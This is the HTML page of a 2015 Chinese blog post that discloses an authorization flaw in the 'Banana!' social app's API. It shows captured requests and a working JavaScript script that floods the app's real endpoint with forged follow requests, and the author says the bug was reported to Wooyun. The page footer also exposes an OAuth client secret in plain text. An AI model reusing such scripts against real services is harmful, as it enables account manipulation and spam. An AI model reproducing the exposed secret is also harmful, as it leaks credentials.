<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Banana!APP漏洞 | DaraW | Code is Poetry</title>

  
  <meta name="author" content="DaraW">
  

  
  <meta name="description" content="JavaScript Developer">
  

  
  
  <meta name="keywords" content="越权">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="Banana!APP漏洞"/>

  <meta property="og:site_name" content="DaraW"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="DaraW" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">DaraW</a>
    </h1>
    <p class="site-description">Code is Poetry</p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
        <li><a href="/about">关于</a></li>
      
        <li><a href="/atom.xml">订阅</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>Banana!APP漏洞</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/23/vulnerability-of-banana-app/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-23T11:02:38.000Z">
          2015-11-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <blockquote>
<p>banana！单身男女汇集地！为你打开一个有趣的【香蕉人的世界】充满香蕉的性福生活，前方高能！！【性福日报】看性福日报，天天涨姿势！【性趣小组】加入性趣小组，畅谈性福生活！【性福商城】免费体验有福利，香蕉兑换有惊喜！【香蕉积分制度】看日报、聊生活、勾搭交友，如果你觉得TA棒棒哒就送TA【香蕉】吃吧！  </p>
</blockquote>
<p><strong>下面我将一步步演示一个屌丝用户的逆袭。</strong>  </p>
<a id="more"></a>
<h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a><strong>抓包</strong></h1><p>通过Fiddler抓包可以看到，在打开一个APP上的话题时，会发出一个POST请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST http://interface2.0.ibananas.cn/api/group/addtopiccomment.json HTTP/1.1  </span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8  </span><br><span class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)  </span><br><span class="line">Host: interface2.0.ibananas.cn  </span><br><span class="line">Connection: Keep-Alive  </span><br><span class="line">Accept-Encoding: gzip  </span><br><span class="line">Content-Length: 153  </span><br><span class="line"></span><br><span class="line">IsAnonymous=1&amp;TopicId=4996&amp;ver=banana_A2.0.1&amp;pno=yingyongbao&amp;Content=%E3%80%82%E3%80%82%E3%80%82&amp;CommenterId=358535&amp;</span><br></pre></td></tr></table></figure></p>
<p>其中几个重点参数：<code>IsAnonymous</code>代表是否匿名，1为匿名，0为不匿名；<code>TopicId</code>为话题ID；<code>Content</code>为内容；<code>CommenterId</code>为评论者ID，即我的ID为358535。<br>那么如何获取指定用户的ID呢？<br>在打开指定用户详情页时会发出一个GET请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET http://interface2.0.ibananas.cn/api/user/getothersuserspaceinfo.json?Ver=banana_A2.0.1&amp;PNO=yingyongbao&amp;OthersUserId=1233&amp;UserId=358535 HTTP/1.1  </span><br><span class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)   </span><br><span class="line">Host: interface2.0.ibananas.cn  </span><br><span class="line">Connection: Keep-Alive  </span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure></p>
<p>其中OthersUserId即为目标用户的ID。<br>在关注其他用户时，会发出一个POST请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST http://interface2.0.ibananas.cn/api/user/addattention.json HTTP/1.1  </span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8  </span><br><span class="line">User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; X9180 Build/KVT49L)  </span><br><span class="line">Host: interface2.0.ibananas.cn  </span><br><span class="line">Connection: Keep-Alive  </span><br><span class="line">Accept-Encoding: gzip  </span><br><span class="line">Content-Length: 62  </span><br><span class="line"></span><br><span class="line">pno=yingyongbao&amp;FriendId=358535&amp;ver=banana_A2.0.1&amp;UserId=1233&amp;</span><br></pre></td></tr></table></figure></p>
<p>可以看出，<code>FriendId</code>为关注者ID,<code>UserId</code>为被关注者ID。  </p>
<p>那么假如我们修改这些参数伪造APP发出请求会怎么样呢？  </p>
<h1 id="逆袭"><a href="#逆袭" class="headerlink" title="逆袭"></a><strong>逆袭</strong></h1><p>首先是从屌丝用户逆袭成 <strong><s>万人瞩目的大V</s></strong>。<br>这里我用JS写了一个脚本。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"sendPost"</span>&gt;</span>Start<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> sendButton = <span class="built_in">document</span>.getElementById(<span class="string">"sendPost"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	sendButton.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="keyword">for</span> (i = <span class="number">25000</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">			xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">					&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">						alert(<span class="string">"unsuccess: "</span> + xhr.status);</span></span><br><span class="line"><span class="undefined">					&#125;</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			xhr.open(<span class="string">"post"</span>, <span class="string">"http://interface2.0.ibananas.cn/api/user/addattention.json"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">			xhr.send(<span class="string">"pno=yingyongbao&amp;FriendId="</span> + i + <span class="string">"&amp;ver=banana_A2.0.1&amp;UserId=358535&amp;"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>脚本跑了一会儿，效果不错：<br><img src="/img/banana1.png" alt=""><br><img src="/img/banana2.png" alt="">    </p>
<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a><strong>尾声</strong></h1><p>同样，按照上述规律可以修改脚本实现刷评论等等。   </p>
<p>至此，我已经没有继续玩下去的兴趣了，将漏洞报上了Wooyun。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/信息安全/">信息安全</a>
    </span>
    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/越权/">越权</a>
    </span>
    

    </div>

    
  </div>
</article>

  
	<section id="comment" class="comment">
		<div id="gitment"></div>
	</section>
	<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
	<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
	<script>
		var gitment = new Gitment({
			owner: 'CodeDaraW',
			repo: 'Blog',
			oauth: {
				client_id: '9f8c0418f979e3f9436d',
				client_secret: '3cb6eb7ebba52973d5d4083533b8eba117462319',
			},
		})
		gitment.render('gitment')
	</script>





    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2018 DaraW
    
  </p>
</footer>
    
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-75095706-1', 'auto');
    ga('send', 'pageview');

</script>

  </div>
</div>
</body>
</html>